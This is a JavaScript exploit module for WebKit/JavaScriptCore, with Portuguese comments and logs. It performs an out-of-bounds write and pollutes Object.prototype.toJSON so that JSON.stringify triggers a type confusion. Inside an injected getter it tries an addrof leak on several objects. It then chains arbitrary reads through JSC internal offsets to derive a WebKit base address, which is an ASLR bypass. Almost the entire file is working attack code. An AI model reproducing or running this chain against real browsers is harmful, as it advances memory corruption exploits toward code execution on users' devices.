// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R43m - Testando Addrof com Diferentes Objetos no Getter)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    arb_read,
    oob_write_absolute,
    isOOBReady,
    selfTestOOBReadWrite,
    selfTestTypeConfusionAndMemoryControl
} from '../core_exploit.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R43_WebKitLeak";

const VICTIM_BUFFER_SIZE = 256; 
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE = 0x7C;
const OOB_WRITE_VALUES_V82 = [0xABABABAB]; 

const FILL_PATTERN_V82_FOR_GETTER_SCRATCHPAD = Math.random(); 
const PROBE_CALL_LIMIT_V82 = 10;

const JSC_FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE = new AdvancedInt64(0x0, 0x18); 
const JSC_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM = new AdvancedInt64(0x0, 0x8);   

let leaked_target_addr_global = null; // Endereço do objeto que conseguirmos vazar
let type_of_leaked_addr_global = ""; // Tipo do objeto cujo endereço foi vazado

function isValidPointer(ptr, context = "") {
    if (!isAdvancedInt64Object(ptr)) return false;
    const high = ptr.high();
    const low = ptr.low();
    if (high === 0 && low === 0) return false;    
    if (high === 0x7FF80000 && low === 0x0) return false; 
    if ((high & 0x7FF00000) === 0x7FF00000) return false; 
    if (high === 0 && low < 0x10000) return false;
    return true;
}

export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() { 
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: TC + Addrof + WebKit Base Leak (R43m) ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_CURRENT_TEST_BASE} Init R43m...`;

    logS3(`--- Fase 0 (R43m): Sanity Checks do Core Exploit ---`, "subtest", FNAME_CURRENT_TEST_BASE);
    let coreOOBReadWriteOK = false;
    try {
        coreOOBReadWriteOK = await selfTestOOBReadWrite(logS3);
        logS3(`Sanity Check (selfTestOOBReadWrite): ${coreOOBReadWriteOK ? 'SUCESSO' : 'FALHA'}`, coreOOBReadWriteOK ? 'good' : 'critical', FNAME_CURRENT_TEST_BASE);
    } catch (e_sanity) {
        logS3(`Erro durante Sanity Checks: ${e_sanity.message}`, "critical", FNAME_CURRENT_TEST_BASE);
    }
    await PAUSE_S3(100);

    let iteration_results_summary = [];
    let best_result_for_runner = {
        errorOccurred: null, tc_probe_details: null, stringifyResult: null,
        addrof_result: { success: false, msg: "Addrof (R43m): Not run.", leaked_object_addr: null, leaked_object_type: null, leaked_object_addr_candidate_str: null },
        webkit_leak_result: { success: false, msg: "WebKit Leak (R43m): Not run.", webkit_base_candidate: null, internal_ptr_stage1: null, internal_ptr_stage2: null },
        oob_value_used: null, heisenbug_on_M2_confirmed_by_tc_probe: false
    };
    let final_probe_call_count_for_report = 0;

    for (const current_oob_value of OOB_WRITE_VALUES_V82) {
        leaked_target_addr_global = null; 
        type_of_leaked_addr_global = "";
        const current_oob_hex_val = toHex(current_oob_value !== undefined && current_oob_value !== null ? current_oob_value : 0);
        const FNAME_CURRENT_ITERATION = `${FNAME_CURRENT_TEST_BASE}_OOB${current_oob_hex_val}`;
        logS3(`\n===== ITERATION R43m: OOB Write Value: ${current_oob_hex_val} (Raw: ${current_oob_value}) =====`, "subtest", FNAME_CURRENT_ITERATION);

        let probe_call_count_iter = 0; let victim_typed_array_ref_iter = null;
        let marker_M1_ref_iter = null; let marker_M2_ref_iter = null;
        let iteration_final_tc_details_from_probe = null;
        let iteration_tc_first_detection_done = false;
        let iter_addrof_result = { success: false, msg: "Addrof (R43m): Not run in this iter.", leaked_object_addr: null, leaked_object_type: null, leaked_object_addr_candidate_str: null };

        // Objetos para tentar o addrof DENTRO do getter
        const targetFuncInGetter = function someUniqueLeakFunctionR43m_GetterInstance() { return `target_R43m_getter_${Date.now()}`; };
        const targetSimpleObjInGetter = { name: "SimpleObjInGetter", id: Math.random() };
        let targetABInGetter = null; // Será o victim_typed_array_ref_iter.buffer

        function toJSON_TA_Probe_Iter_Closure_R43m() {
            probe_call_count_iter++; const call_num = probe_call_count_iter; const ctts = Object.prototype.toString.call(this);
            const is_m2c = (this === marker_M2_ref_iter && marker_M2_ref_iter !== null && ctts === '[object Object]');
            
            try {
                if (call_num > PROBE_CALL_LIMIT_V82) return { r_stop: "limit" };
                if (call_num === 1 && this === victim_typed_array_ref_iter) {
                    marker_M2_ref_iter = { marker_id_v82: "M2_Iter_R43m" };
                    marker_M1_ref_iter = { marker_id_v82: "M1_Iter_R43m", payload_M2: marker_M2_ref_iter };
                    logS3(`[PROBE_R43m] Call #${call_num}: 'this' é victim_typed_array. M1/M2 criados.`, "debug");
                    return marker_M1_ref_iter;
                } else if (is_m2c) { 
                    if (!iteration_tc_first_detection_done) {
                        iteration_tc_first_detection_done = true;
                        iteration_final_tc_details_from_probe = {
                            call_number_tc_detected: call_num, probe_variant: "TA_Probe_R43m", this_type: "[object Object]",
                            this_is_M2: true, getter_defined: false, getter_fired: false, 
                            leak_val_getter_int64: null, leak_val_getter_is_ptr: false, error_probe: null
                        };
                        logS3(`[PROBE_R43m] Call #${call_num} (M2C): FIRST TC. ID:${this.marker_id_v82}. Definindo getter...`, "vuln");

                        try {
                            Object.defineProperty(this, 'leaky_addr_getter_R43m', {
                                get: function() {
                                    logS3(`[PROBE_R43m_GETTER] Getter 'leaky_addr_getter_R43m' ACIONADO!`, "vuln");
                                    if (iteration_final_tc_details_from_probe) iteration_final_tc_details_from_probe.getter_fired = true;

                                    if (!victim_typed_array_ref_iter?.buffer) { /* ... como antes ... */ return "getter_victim_null"; }
                                    targetABInGetter = victim_typed_array_ref_iter.buffer; // Definir o alvo do ArrayBuffer

                                    const targetsToTest = [
                                        { name: "Função JS", obj: targetFuncInGetter },
                                        { name: "Objeto Simples", obj: targetSimpleObjInGetter },
                                        { name: "ArrayBuffer da Vítima", obj: targetABInGetter },
                                        { name: "Marker M2 (this)", obj: marker_M2_ref_iter }
                                    ];

                                    let float_view = new Float64Array(victim_typed_array_ref_iter.buffer);
                                    let uint32_view = new Uint32Array(victim_typed_array_ref_iter.buffer);
                                    const original_low = uint32_view[0]; const original_high = uint32_view[1];
                                    let localAddrofSuccess = false;

                                    for (const target of targetsToTest) {
                                        if (localAddrofSuccess) break; // Já encontramos um endereço válido
                                        logS3(`[PROBE_R43m_GETTER] Tentando addrof para: ${target.name}`, 'debug');
                                        if (target.obj === null || typeof target.obj === 'undefined') {
                                            logS3(`[PROBE_R43m_GETTER] Objeto alvo '${target.name}' é nulo/undefined. Pulando.`, 'warn');
                                            continue;
                                        }
                                        try {
                                            float_view[0] = target.obj; 
                                            const leaked_low = uint32_view[0];
                                            const leaked_high = uint32_view[1];
                                            logS3(`[PROBE_R43m_GETTER_DEBUG] Para '${target.name}', Raw após escrita: low=0x${leaked_low.toString(16)}, high=0x${leaked_high.toString(16)}`, "leak");
                                            
                                            const potential_addr = new AdvancedInt64(leaked_low, leaked_high); 
                                            const candidate_str = potential_addr.toString(true);
                                            if (iteration_final_tc_details_from_probe && !iteration_final_tc_details_from_probe.leak_val_getter_int64) { // Salva o primeiro candidato
                                                 iteration_final_tc_details_from_probe.leak_val_getter_int64 = candidate_str;
                                            }

                                            if (isValidPointer(potential_addr, `_getterAddrof_${target.name}`)) {
                                                leaked_target_addr_global = potential_addr; 
                                                type_of_leaked_addr_global = target.name;
                                                iter_addrof_result.leaked_object_addr = leaked_target_addr_global.toString(true);
                                                iter_addrof_result.leaked_object_type = target.name;
                                                iter_addrof_result.leaked_object_addr_candidate_str = candidate_str;
                                                iter_addrof_result.success = true;
                                                iter_addrof_result.msg = `AddrofGetter (R43m): Sucesso para '${target.name}'.`;
                                                if (iteration_final_tc_details_from_probe) {
                                                    iteration_final_tc_details_from_probe.leak_val_getter_int64 = candidate_str;
                                                    iteration_final_tc_details_from_probe.leak_val_getter_is_ptr = true;
                                                }
                                                logS3(`[PROBE_R43m_GETTER] SUCESSO! Addr de '${target.name}': ${leaked_target_addr_global.toString(true)}`, "vuln");
                                                localAddrofSuccess = true; // Para sair do loop de alvos
                                                break; 
                                            } else {
                                                // iter_addrof_result.msg = `AddrofGetter (R43m) para '${target.name}': Candidato (${candidate_str}) inválido.`;
                                                if (leaked_low === original_low && leaked_high === original_high && float_view[0] !== target.obj) {
                                                    logS3(`[PROBE_R43m_GETTER] Para '${target.name}', conteúdo do buffer não alterado.`, "warn");
                                                }
                                            }
                                        } catch (e_addrof_getter_target) {
                                            logS3(`[PROBE_R43m_GETTER] EXCEPTION para '${target.name}': ${e_addrof_getter_target.message}`, "error");
                                            console.error(`[PROBE_R43m_GETTER] Exceção para ${target.name}:`, e_addrof_getter_target);
                                        } finally {
                                            uint32_view[0] = original_low; // Restaura para a próxima tentativa no loop de alvos
                                            uint32_view[1] = original_high;
                                        }
                                    } // Fim do loop targetsToTest

                                    if (!localAddrofSuccess) { // Se nenhum addrof funcionou
                                        iter_addrof_result.msg = `AddrofGetter (R43m): Falha ao obter endereço válido para todos os alvos testados. Último candidato: ${iter_addrof_result.leaked_object_addr_candidate_str || 'N/A'}`;
                                    }
                                    return localAddrofSuccess ? "getter_addrof_success" : "getter_addrof_failed_all_targets";
                                },
                                enumerable: true, configurable: true
                            });
                            if (iteration_final_tc_details_from_probe) iteration_final_tc_details_from_probe.getter_defined = true;
                        } catch (e_def_getter) {
                            if (iteration_final_tc_details_from_probe) iteration_final_tc_details_from_probe.error_probe = `DefineGetterErr: ${e_def_getter.message}`;
                        }
                    }
                    return this; 
                }
            } catch (e_pm) { /* ... */ }
            return { gen_m: call_num, type: ctts };
        }

        // ... (resto da lógica da iteração: TC, Fase 2 WebKitLeak, sumário)
        // Copiando a lógica da iteração para garantir a integridade
        let iter_raw_stringify_output = null; let iter_stringify_output_parsed = null;
        let iter_primary_error = null;
        let iter_webkit_leak_result = { success: false, msg: "WebKit Leak (R43m): Not run in this iter.", webkit_base_candidate: null, internal_ptr_stage1: null, internal_ptr_stage2: null };
        let heisenbugConfirmedThisIter = false;

        try {
            logS3(`  --- Fase 1 (R43m): Detecção de Type Confusion & Addrof via Getter ---`, "subtest", FNAME_CURRENT_ITERATION);
            await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_ITERATION}-TCSetup` });
            oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE, current_oob_value, 4);
            await PAUSE_S3(150);
            victim_typed_array_ref_iter = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE));
            new Float64Array(victim_typed_array_ref_iter.buffer).fill(FILL_PATTERN_V82_FOR_GETTER_SCRATCHPAD);

            const ppKey = 'toJSON'; let origDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey); let polluted = false;
            try {
                Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_Iter_Closure_R43m, writable: true, configurable: true, enumerable: false });
                polluted = true;
                iter_raw_stringify_output = JSON.stringify(victim_typed_array_ref_iter);
                try { iter_stringify_output_parsed = JSON.parse(iter_raw_stringify_output); } catch (e_p) { iter_stringify_output_parsed = { err_parse: iter_raw_stringify_output }; }

                if (iteration_final_tc_details_from_probe && iteration_final_tc_details_from_probe.this_is_M2) {
                    heisenbugConfirmedThisIter = true;
                    logS3(`  TC Probe R43m: TC on M2 CONFIRMED. Getter definido: ${iteration_final_tc_details_from_probe.getter_defined}. Getter acionado: ${iteration_final_tc_details_from_probe.getter_fired}. Addrof success: ${iter_addrof_result.success}. Addr: ${iter_addrof_result.leaked_object_addr || iter_addrof_result.leaked_object_addr_candidate_str || 'N/A'} (Tipo: ${iter_addrof_result.leaked_object_type || 'N/A'})`, iter_addrof_result.success ? "vuln" : "warn");
                } else {
                    logS3(`  TC Probe R43m: TC on M2 NOT Confirmed. Details: ${JSON.stringify(iteration_final_tc_details_from_probe)}`, "error");
                }
            } catch (e_str) {
                if (!iter_primary_error) iter_primary_error = e_str;
                logS3(`  TC/Addrof Probe R43m: JSON.stringify EXCEPTION: ${e_str.message}`, "error");
                 console.error("Erro no stringify R43m:", e_str);
            } finally {
                if (polluted) {
                    if (origDesc) Object.defineProperty(Object.prototype, ppKey, origDesc); else delete Object.prototype[ppKey];
                }
            }
            logS3(`  --- Fase 1 (R43m) Concluída. TC M2: ${heisenbugConfirmedThisIter}. Addrof Sucesso: ${iter_addrof_result.success} (Tipo Objeto Vazado: ${iter_addrof_result.leaked_object_type || 'N/A'}) ---`, "subtest");
            await PAUSE_S3(100);

            logS3(`  --- Fase 2 (R43m): Teste de WebKit Base Leak ---`, "subtest", FNAME_CURRENT_ITERATION);
            if (heisenbugConfirmedThisIter && iter_addrof_result.success && leaked_target_addr_global) {
                if (!coreOOBReadWriteOK) { 
                    iter_webkit_leak_result.msg = "WebKit Leak (R43m): Pulado. Core OOB R/W Sanity Check FALHOU. arb_read instável.";
                    logS3(iter_webkit_leak_result.msg, "critical");
                } else if (type_of_leaked_addr_global !== "Função JS") {
                     iter_webkit_leak_result.msg = `WebKit Leak (R43m): Pulado. Endereço vazado é de '${type_of_leaked_addr_global}', não de uma Função JS. Offsets podem não se aplicar.`;
                    logS3(iter_webkit_leak_result.msg, "warn");
                }
                else {
                     if (!isOOBReady(`${FNAME_CURRENT_ITERATION}-PreArbReadCheck`)) {
                         await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_ITERATION}-PreArbReadCheckReinit` });
                     }
                
                    if (!isOOBReady()) {
                        iter_webkit_leak_result.msg = "WebKit Leak (R43m): Falha ao preparar/re-preparar ambiente OOB para arb_read.";
                        logS3(iter_webkit_leak_result.msg, "error");
                    } else {
                        try {
                            logS3(`  WebKitLeak: Endereço do objeto alvo ('${type_of_leaked_addr_global}'): ${leaked_target_addr_global.toString(true)}`, 'info');

                            const ptr_to_executable_instance = await arb_read(leaked_target_addr_global.add(JSC_FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE), 8);
                            iter_webkit_leak_result.internal_ptr_stage1 = isAdvancedInt64Object(ptr_to_executable_instance) ? ptr_to_executable_instance.toString(true) : String(ptr_to_executable_instance);
                            if (!isValidPointer(ptr_to_executable_instance, "_execInst")) {
                                throw new Error(`Ponteiro para ExecutableInstance inválido ou nulo: ${iter_webkit_leak_result.internal_ptr_stage1}`);
                            }
                            logS3(`  WebKitLeak: Ponteiro para ExecutableInstance lido de [addr + ${JSC_FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE.toString(true)}]: ${ptr_to_executable_instance.toString(true)}`, 'leak');
                            
                            const ptr_to_jit_or_vm = await arb_read(ptr_to_executable_instance.add(JSC_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM), 8);
                            iter_webkit_leak_result.internal_ptr_stage2 = isAdvancedInt64Object(ptr_to_jit_or_vm) ? ptr_to_jit_or_vm.toString(true) : String(ptr_to_jit_or_vm);
                            if (!isValidPointer(ptr_to_jit_or_vm, "_jitVm")) {
                                throw new Error(`Ponteiro para JIT/VM inválido ou nulo: ${iter_webkit_leak_result.internal_ptr_stage2}`);
                            }
                            logS3(`  WebKitLeak: Ponteiro para JIT/VM lido de [exec_addr + ${JSC_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM.toString(true)}]: ${ptr_to_jit_or_vm.toString(true)}`, 'leak');
                            
                            const page_mask_4kb = new AdvancedInt64(0x0, ~0xFFF);   
                            const webkit_base_candidate = ptr_to_jit_or_vm.and(page_mask_4kb); 

                            iter_webkit_leak_result.webkit_base_candidate = webkit_base_candidate.toString(true);
                            iter_webkit_leak_result.success = true;
                            iter_webkit_leak_result.msg = `WebKitLeak (R43m): Candidato a base do WebKit: ${webkit_base_candidate.toString(true)}`;
                            logS3(`  WebKitLeak: SUCESSO! ${iter_webkit_leak_result.msg}`, "vuln");

                        } catch (e_webkit_leak) {
                            iter_webkit_leak_result.msg = `WebKitLeak (R43m) EXCEPTION: ${e_webkit_leak.message || String(e_webkit_leak)}`;
                            logS3(`  WebKitLeak: ERRO - ${iter_webkit_leak_result.msg}`, "error");
                            if (!iter_primary_error) iter_primary_error = e_webkit_leak;
                             console.error("Erro no WebKitLeak R43m:", e_webkit_leak);
                        }
                    }
                }
            } else {
                 let skipMsg = "WebKitLeak (R43m): Pulado. ";
                 if (!heisenbugConfirmedThisIter) skipMsg += "TC Fase 1 falhou. ";
                 if (!iter_addrof_result.success) skipMsg += "Addrof falhou. ";
                 if (!leaked_target_addr_global) skipMsg += "Endereço do objeto alvo não obtido. ";
                 iter_webkit_leak_result.msg = skipMsg;
                 logS3(iter_webkit_leak_result.msg, "warn");
            }
            logS3(`  --- Fase 2 (R43m) Concluída. WebKitLeak Sucesso: ${iter_webkit_leak_result.success} ---`, "subtest");

        } catch (e_outer_iter) { 
            if (!iter_primary_error) iter_primary_error = e_outer_iter;
            logS3(`  CRITICAL ERROR ITERATION R43m: ${e_outer_iter.message || String(e_outer_iter)}`, "critical", FNAME_CURRENT_ITERATION);
             console.error("Outer error in iteration R43m:", e_outer_iter);
        } finally {
            await clearOOBEnvironment({ caller_fname: `${FNAME_CURRENT_ITERATION}-FinalClearR43m` });
        }

        final_probe_call_count_for_report = probe_call_count_iter;
        
        current_iter_summary = {
            oob_value: current_oob_hex_val,
            error: iter_primary_error ? (iter_primary_error.message || String(iter_primary_error)) : null,
            tc_probe_details: iteration_final_tc_details_from_probe ? JSON.parse(JSON.stringify(iteration_final_tc_details_from_probe)) : null,
            stringifyResult: iter_stringify_output_parsed,
            addrof_result_this_iter: iter_addrof_result, 
            webkit_leak_result_this_iter: iter_webkit_leak_result, 
            heisenbug_on_M2_confirmed_by_tc_probe: heisenbugConfirmedThisIter
        };
        iteration_results_summary.push(current_iter_summary);
        
        if (current_iter_summary.error === null) {
            let current_is_better_than_best = false;
            if (best_result_for_runner.errorOccurred !== null || best_result_for_runner.oob_value_used === null ) {
                current_is_better_than_best = true;
            } else {
                const current_score = (current_iter_summary.webkit_leak_result_this_iter.success ? 4 : 0) +
                                      (current_iter_summary.addrof_result_this_iter.success ? 2 : 0) +
                                      (current_iter_summary.heisenbug_on_M2_confirmed_by_tc_probe ? 1 : 0);
                const best_score = (best_result_for_runner.webkit_leak_result.success ? 4 : 0) +
                                   (best_result_for_runner.addrof_result.success ? 2 : 0) +
                                   (best_result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe ? 1 : 0);
                if (current_score > best_score) {
                    current_is_better_than_best = true;
                }
            }

            if (current_is_better_than_best) {
                 best_result_for_runner = {
                    errorOccurred: null,
                    tc_probe_details: current_iter_summary.tc_probe_details,
                    stringifyResult: current_iter_summary.stringifyResult,
                    addrof_result: current_iter_summary.addrof_result_this_iter,
                    webkit_leak_result: current_iter_summary.webkit_leak_result_this_iter,
                    oob_value_used: current_iter_summary.oob_value,
                    heisenbug_on_M2_confirmed_by_tc_probe: current_iter_summary.heisenbug_on_M2_confirmed_by_tc_probe
                };
            }
        } else if (best_result_for_runner.oob_value_used === null && current_oob_value === OOB_WRITE_VALUES_V82[OOB_WRITE_VALUES_V82.length - 1]) {
            best_result_for_runner = { 
                errorOccurred: current_iter_summary.error,
                tc_probe_details: current_iter_summary.tc_probe_details,
                stringifyResult: current_iter_summary.stringifyResult,
                addrof_result: current_iter_summary.addrof_result_this_iter,
                webkit_leak_result: current_iter_summary.webkit_leak_result_this_iter,
                oob_value_used: current_iter_summary.oob_value,
                heisenbug_on_M2_confirmed_by_tc_probe: current_iter_summary.heisenbug_on_M2_confirmed_by_tc_probe
            };
        }

        if (iter_webkit_leak_result.success) document.title = `${FNAME_CURRENT_TEST_BASE}_R43m: WebKitLeak OK!`;
        else if (iter_addrof_result.success) document.title = `${FNAME_CURRENT_TEST_BASE}_R43m: Addrof OK (${iter_addrof_result.leaked_object_type})`;
        else if (heisenbugConfirmedThisIter) document.title = `${FNAME_CURRENT_TEST_BASE}_R43m: TC OK`;
        else document.title = `${FNAME_CURRENT_TEST_BASE}_R43m: Iter Done (${current_oob_hex_val})`;
        await PAUSE_S3(250);
    }
    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed ---`, "test", FNAME_CURRENT_TEST_BASE);
    logS3(`Best/Final result (R43m): ${JSON.stringify(best_result_for_runner, null, 2)}`, "debug", FNAME_CURRENT_TEST_BASE);
    return {
        errorOccurred: best_result_for_runner.errorOccurred,
        tc_probe_details: best_result_for_runner.tc_probe_details,
        stringifyResult: best_result_for_runner.stringifyResult,
        addrof_result: best_result_for_runner.addrof_result,
        webkit_leak_result: best_result_for_runner.webkit_leak_result,
        iteration_results_summary: iteration_results_summary,
        total_probe_calls_last_iter: final_probe_call_count_for_report,
        oob_value_of_best_result: best_result_for_runner.oob_value_used,
        heisenbug_on_M2_in_best_result: best_result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe
    };
}
